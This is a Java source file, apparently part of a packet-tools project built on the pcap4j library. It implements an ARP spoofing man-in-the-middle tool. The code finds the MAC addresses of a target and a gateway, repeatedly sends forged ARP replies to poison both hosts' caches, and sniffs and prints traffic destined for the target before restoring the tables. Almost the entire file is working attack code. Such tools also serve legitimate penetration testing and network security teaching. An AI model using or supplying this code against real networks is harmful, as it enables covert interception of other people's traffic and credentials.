package com.pkt.tools;

import org.pcap4j.util.MacAddress;

import com.pkt.tools.exceptions.HAddrNotFoundException;
import com.pkt.tools.packets.ARP;
import com.pkt.tools.packets.EthernetFrame;
import com.pkt.tools.utils.NetworkUtils;
import com.pkt.tools.utils.Utils;

import org.pcap4j.core.PcapHandle;
import org.pcap4j.core.PcapNetworkInterface;
import org.pcap4j.core.PcapPacket;
import org.pcap4j.core.BpfProgram.BpfCompileMode;
import org.pcap4j.packet.EthernetPacket;
import org.pcap4j.packet.Packet;
import org.pcap4j.packet.ArpPacket.Builder;
import org.pcap4j.packet.namednumber.EtherType;

public class Arper implements Runnable {
    private String attackerIP;
    private String gatewayIP;
    private String targetIP;
    private MacAddress attackerMac;
    private MacAddress gatewayMac;
    private MacAddress targetMac;
    private PcapNetworkInterface nif;

    public Arper(String targetIP, String gatewayIP) {
        try {
            configure(targetIP, gatewayIP);
        } catch (HAddrNotFoundException e) {
            e.printStackTrace();
        }
    }

    public Arper(String attackerIP,
            MacAddress attackerMac,
            String targetIP,
            MacAddress targetMac,
            String gatewayIP,
            MacAddress gatewayMac) {
        this.attackerIP = attackerIP;
        this.attackerMac = attackerMac;
        this.targetIP = targetIP;
        this.targetMac = targetMac;
        this.gatewayIP = gatewayIP;
        this.gatewayMac = gatewayMac;
    }

    public void run() {
        summary();
        System.out.write('.');
        PcapHandle poisonHandle = NetworkUtils.createPcapHandle(nif);
        PcapHandle restoreHandle = NetworkUtils.createPcapHandle(nif);

        poison(poisonHandle);

        System.out.println("Restoring...\n");
        restoreArpTables(restoreHandle);

    }

    public void run(int packetCount) {
        summary();

        PcapHandle poisonHandle = NetworkUtils.createPcapHandle(nif);
        PcapHandle restoreHandle = NetworkUtils.createPcapHandle(nif);
        PcapHandle sniffHandle = NetworkUtils.createPcapHandle(nif);

        final Sniff sniff = new Sniff(sniffHandle);

        sniff.setFilter("not arp and dst host " + targetIP);
        System.out.println("\nRunning...");

        Thread poisonThread = new Thread(() -> poison(poisonHandle));

        Thread sniffThread = new Thread(() -> {
            try {
                int num = 0;
                while (true) {
                    Packet packet = sniff.capturePacket();
                    System.out.println(packet);

                    if (num >= packetCount) {
                        break;
                    } else {
                        num++;
                    }
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        });

        sniffThread.start();
        poisonThread.start();

        try {
            sniffThread.join();
        } catch (InterruptedException e) {
            e.printStackTrace();
        }

        System.out.println("Re-Arping ARP Tables...\n");
        restoreArpTables(restoreHandle);

        sniff.close();

    }

    private void poison(PcapHandle handle) {
        while (true) {
            EthernetPacket victim = buildArpPacket(gatewayIP, attackerMac, targetIP, targetMac);
            EthernetPacket gateway = buildArpPacket(targetIP, attackerMac, gatewayIP, gatewayMac);
            try {
                handle.sendPacket(gateway);
                handle.sendPacket(victim);
                handle.wait(2000);
            } catch (Exception e) {
                e.printStackTrace();
                break;
            }

        }
    }

    private void restoreArpTables(PcapHandle handle) {
        try {
            EthernetPacket victim = buildArpPacket(gatewayIP, gatewayMac, targetIP, targetMac);
            EthernetPacket gateway = buildArpPacket(targetIP, targetMac, gatewayIP, gatewayMac);
            handle.sendPacket(gateway);
            handle.sendPacket(victim);
            handle.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void configure(String targetIP, String gatewayIP) throws HAddrNotFoundException {
        this.nif = NetworkUtils.selectNetWorkInterface();
        this.attackerIP = nif.getAddresses().get(0).getAddress().getHostAddress();
        this.attackerMac = MacAddress.getByAddress(nif.getLinkLayerAddresses().get(0).getAddress());
        this.targetIP = targetIP;
        this.targetMac = getMac(targetIP);
        this.gatewayIP = gatewayIP;
        this.gatewayMac = getMac(gatewayIP);
    }

    private MacAddress getMac(String ipAddr) {
        PcapHandle handle;
        try {
            handle = NetworkUtils.createPcapHandle(nif);
            handle.setFilter("arp and src host " + ipAddr,
                    BpfCompileMode.OPTIMIZE);

            EthernetPacket arpPckt = buildArpPacket(
                    attackerIP,
                    attackerMac,
                    ipAddr,
                    MacAddress.ETHER_BROADCAST_ADDRESS);

            handle.sendPacket(arpPckt);
            Utils.sleep(1000);

            PcapPacket frame = handle.getNextPacketEx();
            handle.close();

            MacAddress srcHardwareAddr = frame
                    .getPacket()
                    .get(EthernetPacket.class)
                    .getHeader()
                    .getSrcAddr();

            if (srcHardwareAddr == null) {
                throw new HAddrNotFoundException();
            }

            return srcHardwareAddr;
        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }

    }

    private EthernetPacket buildArpPacket(String srcIP, MacAddress srcMac, String dstIP, MacAddress dstMac) {
        ARP arp = new ARP(srcIP, dstIP, srcMac, dstMac);
        Builder linkLayerPayload = arp.getPacket();

        EthernetFrame frame = new EthernetFrame(srcMac, dstMac, linkLayerPayload, EtherType.ARP);
        EthernetPacket packet = frame.getFrame().build();

        return packet;
    }

    private void summary() {
        System.out.println("\nSummary: ");
        System.out.printf("src IP: %s", this.attackerIP);
        System.out.println();
        System.out.printf("src HAddr: %s", this.attackerMac);
        System.out.println();
        System.out.printf("gateway IP: %s", this.gatewayIP);
        System.out.println();
        System.out.printf("gateway HAddr: %s", this.gatewayMac);
        System.out.println();
        System.out.printf("target IP: %s", this.targetIP);
        System.out.println();
        System.out.printf("target HAddr: %s", this.targetMac);
        System.out.println();
    }

}
